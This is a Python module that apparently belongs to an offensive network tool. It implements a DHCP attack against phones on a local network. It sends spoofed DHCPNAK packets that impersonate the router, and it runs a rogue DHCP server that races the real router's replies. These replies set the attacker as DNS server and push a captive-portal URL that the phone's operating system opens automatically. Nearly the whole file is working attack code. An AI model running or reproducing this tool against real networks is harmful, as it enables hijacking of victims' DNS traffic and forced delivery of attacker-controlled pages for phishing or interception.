"""
DHCP-level zero-touch captive portal trigger.

Two components, both 100% RFC-compliant (no firmware exploits):

1.  ``force_renew_phone()`` — sends a spoofed DHCPNAK on behalf of the
    router.  Modern phones (iOS 12+, Android 8+) react by immediately
    initiating DHCPDISCOVER for a fresh lease.

2.  ``RogueDhcpServer`` — passive scapy sniffer that watches for
    DHCPDISCOVER / DHCPREQUEST and races the real router's reply with
    a spoofed OFFER/ACK containing:

      * Option 6  (DNS Server)              = our IP
      * Option 114 (RFC 8910 Captive Portal) = http://<us>/captive
      * Option 3  (Router)                   = the real gateway

    The Captive Portal option is what makes this zero-touch: when iOS
    or Android sees option 114 in its lease, the OS immediately opens
    its native Captive Network Assistant pointed at our URL.  No DNS
    hijack required, no wifi toggle, no user action.  This is how
    every airport / hotel WiFi already works in the wild.

Privileges: Npcap raw send + admin.  We rely on the same scapy stack
the rest of Aggressive Mode uses.
"""

from __future__ import annotations

import asyncio
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Any

from app.logging_setup import get_logger

log = get_logger("dhcp_attack")


def _build_captive_url(our_ip: str) -> str:
    return f"http://{our_ip}/captive"


def _option_blob(captive_url: str, dns_ip: str, router_ip: str,
                  lease_seconds: int) -> bytes:
    """Build the DHCP options TLV section common to OFFER/ACK replies."""
    si = socket.inet_aton(dns_ip)
    ri = socket.inet_aton(router_ip)
    url = captive_url.encode("ascii", errors="replace")
    blocks = [
        bytes([54, 4]) + si,                       # server identifier
        bytes([51, 4]) + struct.pack("!I", lease_seconds),   # lease time
        bytes([3, 4]) + ri,                        # router (real gateway)
        bytes([6, 4]) + si,                        # DNS = us
        bytes([1, 4]) + bytes([255, 255, 255, 0]), # subnet mask
        bytes([114, len(url)]) + url,              # RFC 8910 captive portal
        b"\xff",                                   # end
    ]
    return b"".join(blocks)


def _build_dhcp_reply(*, xid: bytes, chaddr: bytes, yiaddr: str,
                      our_ip: str, router_ip: str, captive_url: str,
                      message_type: int, lease_seconds: int = 1800) -> bytes:
    """Construct the BOOTP+DHCP payload for OFFER (2) or ACK (5)."""
    op = b"\x02"
    htype_hlen = b"\x01\x06\x00"
    flags = b"\x00\x00\x80\x00"
    yi = socket.inet_aton(yiaddr)
    si = socket.inet_aton(our_ip)
    gi = b"\x00\x00\x00\x00"
    chaddr_pad = chaddr + b"\x00" * (16 - len(chaddr))
    magic = b"\x63\x82\x53\x63"
    msg_type = bytes([53, 1, message_type])
    options = msg_type + _option_blob(captive_url, our_ip, router_ip, lease_seconds)
    return (op + htype_hlen + xid + flags + b"\x00\x00\x00\x00"
            + yi + si + gi + chaddr_pad
            + b"\x00" * 64                # sname
            + b"\x00" * 128               # boot file
            + magic + options)


def _build_dhcp_nak(*, xid: bytes, chaddr: bytes, router_ip: str) -> bytes:
    """DHCPNAK — RFC 2131.  Tells the client its current lease is invalid
    and forces immediate re-acquisition."""
    op = b"\x02"
    htype_hlen = b"\x01\x06\x00"
    flags = b"\x00\x00\x80\x00"
    chaddr_pad = chaddr + b"\x00" * (16 - len(chaddr))
    magic = b"\x63\x82\x53\x63"
    ri = socket.inet_aton(router_ip)
    options = (
        bytes([53, 1, 6])             # DHCP Message Type = NAK
        + bytes([54, 4]) + ri          # server identifier = real router (spoofed)
        + b"\xff"
    )
    return (op + htype_hlen + xid + flags + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"      # ciaddr
            + b"\x00\x00\x00\x00"      # yiaddr
            + b"\x00\x00\x00\x00"      # siaddr
            + b"\x00\x00\x00\x00"      # giaddr
            + chaddr_pad
            + b"\x00" * 64 + b"\x00" * 128
            + magic + options)


# ── DHCP option parser (just enough to find msg-type + xid + chaddr) ──

def _parse_dhcp(data: bytes) -> dict[str, Any] | None:
    if len(data) < 240 or data[:1] != b"\x01":      # need BOOTREQUEST
        return None
    xid = data[4:8]
    chaddr = data[28:28 + 6]
    if data[236:240] != b"\x63\x82\x53\x63":
        return None
    msg_type = None
    i = 240
    while i < len(data):
        c = data[i]
        if c == 0xff: break
        if c == 0x00: i += 1; continue
        if i + 1 >= len(data): break
        l = data[i + 1]
        v = data[i + 2:i + 2 + l]
        if c == 53 and l >= 1:
            msg_type = v[0]
        i += 2 + l
    return {"xid": xid, "chaddr": chaddr, "msg_type": msg_type}


# ── Public API ────────────────────────────────────────────────────────

def force_renew_phone(*, phone_ip: str, phone_mac: str, router_ip: str,
                      router_mac: str, our_mac: str, iface: str) -> int:
    """Send N spoofed DHCPNAKs to force the phone to re-DHCP."""
    from scapy.all import Ether, IP, UDP, sendp     # type: ignore[import-not-found]
    chaddr = bytes.fromhex(phone_mac.replace(":", ""))
    xid = b"\x00\x00\x00\x00"     # NAK requires matching xid but most
                                  # clients accept on chaddr alone
    payload = _build_dhcp_nak(xid=xid, chaddr=chaddr, router_ip=router_ip)
    sent = 0
    for _ in range(3):            # 3 bursts in case of WiFi loss
        pkt = (
            Ether(src=router_mac, dst=phone_mac)
            / IP(src=router_ip, dst=phone_ip)
            / UDP(sport=67, dport=68)
            / payload
        )
        sendp(pkt, iface=iface, verbose=False)
        sent += 1
        time.sleep(0.1)
    log.info("dhcp_attack.force_renew_sent",
             phone=phone_ip, mac=phone_mac, count=sent)
    return sent


@dataclass(slots=True)
class RogueDhcpServer:
    """scapy-based DHCP server that races the real router with
    DHCPOFFER / DHCPACK carrying Option 114 (Captive Portal URL)."""
    our_ip: str
    our_mac: str
    router_ip: str
    router_mac: str
    iface: str
    captive_path: str = "/captive"
    lease_seconds: int = 1800

    seen_discover: int = field(default=0, init=False)
    seen_request: int = field(default=0, init=False)
    races_won: int = field(default=0, init=False)
    last_offers: list[str] = field(default_factory=list, init=False)

    _thread: threading.Thread | None = field(default=None, init=False)
    _stop: threading.Event = field(default_factory=threading.Event, init=False)

    @property
    def captive_url(self) -> str:
        return f"http://{self.our_ip}{self.captive_path}"

    async def start(self) -> None:
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._run, daemon=True, name="rogue-dhcp",
        )
        self._thread.start()
        log.info("rogue_dhcp.start", iface=self.iface, our_ip=self.our_ip,
                 captive_url=self.captive_url)

    async def stop(self) -> None:
        self._stop.set()

    def _run(self) -> None:
        from scapy.all import sniff, UDP, IP, Ether, sendp  # type: ignore[import-not-found]

        def cb(pkt) -> None:
            try:
                if not (pkt.haslayer(UDP) and pkt.haslayer(IP)):
                    return
                udp = pkt[UDP]
                if udp.dport != 67 or udp.sport != 68:
                    return
                payload = bytes(pkt[UDP].payload)
                info = _parse_dhcp(payload)
                if info is None or info.get("msg_type") not in (1, 3):
                    return

                kind = info["msg_type"]
                chaddr = info["chaddr"]
                xid = info["xid"]
                phone_mac = ":".join(f"{b:02x}" for b in chaddr)

                if kind == 1:
                    self.seen_discover += 1
                    msg = 2     # OFFER
                    yiaddr = self._allocate_for(phone_mac, pkt[IP].src)
                else:
                    self.seen_request += 1
                    msg = 5     # ACK
                    yiaddr = self._allocate_for(phone_mac, pkt[IP].src)

                reply_payload = _build_dhcp_reply(
                    xid=xid, chaddr=chaddr, yiaddr=yiaddr,
                    our_ip=self.our_ip, router_ip=self.router_ip,
                    captive_url=self.captive_url,
                    message_type=msg, lease_seconds=self.lease_seconds,
                )
                reply_pkt = (
                    Ether(src=self.our_mac, dst=phone_mac)
                    / IP(src=self.our_ip, dst=yiaddr)
                    / UDP(sport=67, dport=68)
                    / reply_payload
                )
                sendp(reply_pkt, iface=self.iface, verbose=False)
                self.races_won += 1
                self.last_offers.append(f"{phone_mac}->{yiaddr}")
                self.last_offers[:] = self.last_offers[-10:]
                log.info(
                    "rogue_dhcp.replied",
                    phone_mac=phone_mac, yiaddr=yiaddr,
                    kind=("offer" if msg == 2 else "ack"),
                    captive=self.captive_url,
                )
            except Exception as e:
                log.debug("rogue_dhcp.cb_err", err=str(e))

        try:
            sniff(
                iface=self.iface,
                filter="udp port 67",
                prn=cb,
                store=0,
                stop_filter=lambda _p: self._stop.is_set(),
            )
        except Exception as e:
            log.error("rogue_dhcp.sniff_crash", err=str(e))

    def _allocate_for(self, phone_mac: str, current_ip: str) -> str:
        """Best practice: keep the phone's existing IP if it has one
        (i.e. DHCPREQUEST renewing).  Otherwise pull a high address
        from the same /24 as the real router."""
        if current_ip and current_ip != "0.0.0.0":
            return current_ip
        prefix = ".".join(self.router_ip.split(".")[:3])
        return f"{prefix}.{200 + (hash(phone_mac) % 50)}"

    @property
    def stats(self) -> dict[str, Any]:
        return {
            "our_ip": self.our_ip,
            "captive_url": self.captive_url,
            "discovers": self.seen_discover,
            "requests": self.seen_request,
            "races_won": self.races_won,
            "last_offers": list(self.last_offers),
        }
